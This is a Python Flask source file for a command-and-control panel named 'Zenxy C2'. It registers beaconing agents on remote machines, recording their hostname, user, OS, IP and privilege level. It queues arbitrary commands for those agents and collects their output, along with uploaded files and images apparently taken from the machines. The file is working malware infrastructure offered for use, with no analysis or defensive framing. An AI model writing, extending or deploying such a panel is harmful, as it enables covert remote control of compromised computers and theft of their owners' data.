# Zenxy C2 Panel
# Flask + dark monochrome UI
from flask import Flask, render_template, request, jsonify, session, redirect, url_for, send_file
from functools import wraps
import secrets
import time
import os
import json
import base64
from datetime import datetime
from io import BytesIO

app = Flask(__name__)
app.secret_key = secrets.token_hex(32)

# ============ CONFIG ============
ADMIN_PASS = "zenxyadmin"          # change this
ONLINE_THRESHOLD = 90              # seconds
# ================================

agents = {}       # id -> info dict
tasks = {}        # agent_id -> [task, ...]
results = {}      # task_id -> result dict
files = {}        # file_id -> {name, data, agent}

def login_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not session.get("logged_in"):
            return redirect(url_for("login"))
        return f(*args, **kwargs)
    return decorated

def mark_online_status():
    now = time.time()
    for info in agents.values():
        info["online"] = (now - info.get("last_seen", 0)) < ONLINE_THRESHOLD

# ---------- Auth ----------
@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        if request.form.get("password") == ADMIN_PASS:
            session["logged_in"] = True
            return redirect(url_for("dashboard"))
        return render_template("login.html", error="Wrong password")
    return render_template("login.html")

@app.route("/logout")
def logout():
    session.clear()
    return redirect(url_for("login"))

# ---------- Dashboard ----------
@app.route("/")
@login_required
def dashboard():
    mark_online_status()
    online = sum(1 for a in agents.values() if a.get("online"))
    return render_template("index.html", agents=agents, online=online, total=len(agents))

@app.route("/agent/<aid>")
@login_required
def agent_view(aid):
    mark_online_status()
    a = agents.get(aid)
    if not a:
        return redirect(url_for("dashboard"))
    return render_template("agent.html", agent=a, aid=aid)

# ---------- Agent API ----------
@app.route("/api/beacon", methods=["POST"])
def beacon():
    data = request.json or {}
    aid = data.get("id")
    if not aid:
        return jsonify({"error": "no id"}), 400

    prev = agents.get(aid, {})
    agents[aid] = {
        "id": aid,
        "hostname": data.get("hostname", "unknown"),
        "username": data.get("username", "unknown"),
        "os": data.get("os", "unknown"),
        "ip": request.headers.get("X-Forwarded-For", request.remote_addr),
        "last_seen": time.time(),
        "online": True,
        "first_seen": prev.get("first_seen", time.time()),
        "build": data.get("build", "unknown"),
        "privileges": data.get("privileges", "user"),
    }

    pending = tasks.pop(aid, [])
    return jsonify({"tasks": pending})

@app.route("/api/result", methods=["POST"])
def result():
    data = request.json or {}
    tid = data.get("task_id")
    if not tid:
        return jsonify({"error": "no task_id"}), 400

    results[tid] = {
        "output": data.get("output", ""),
        "type": data.get("type", "text"),       # text | image | file
        "filename": data.get("filename"),
        "time": time.time(),
        "agent_id": data.get("agent_id"),
    }

    # store binary files
    if data.get("type") in ("image", "file") and data.get("data"):
        fid = secrets.token_hex(8)
        files[fid] = {
            "name": data.get("filename", "file.bin"),
            "data": data["data"],               # base64
            "agent": data.get("agent_id"),
            "time": time.time(),
        }
        results[tid]["file_id"] = fid

    return jsonify({"ok": True})

@app.route("/api/task", methods=["POST"])
@login_required
def create_task():
    data = request.json or {}
    aid = data.get("agent_id")
    cmd = data.get("cmd")
    if not aid or not cmd:
        return jsonify({"error": "missing fields"}), 400

    tid = secrets.token_hex(8)
    task = {
        "id": tid,
        "cmd": cmd,
        "created": time.time(),
    }
    tasks.setdefault(aid, []).append(task)
    return jsonify({"task_id": tid})

@app.route("/api/result/<tid>")
@login_required
def get_result(tid):
    r = results.get(tid)
    if not r:
        return jsonify({"status": "pending"})
    return jsonify({"status": "done", **r})

@app.route("/api/agents")
@login_required
def list_agents():
    mark_online_status()
    return jsonify(list(agents.values()))

@app.route("/api/file/<fid>")
@login_required
def get_file(fid):
    f = files.get(fid)
    if not f:
        return "Not found", 404
    data = base64.b64decode(f["data"])
    return send_file(BytesIO(data), download_name=f["name"], as_attachment=True)

@app.route("/api/file/<fid>/view")
@login_required
def view_file(fid):
    f = files.get(fid)
    if not f:
        return "Not found", 404
    data = base64.b64decode(f["data"])
    from flask import Response
    return Response(data, mimetype="image/png")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080, debug=False)
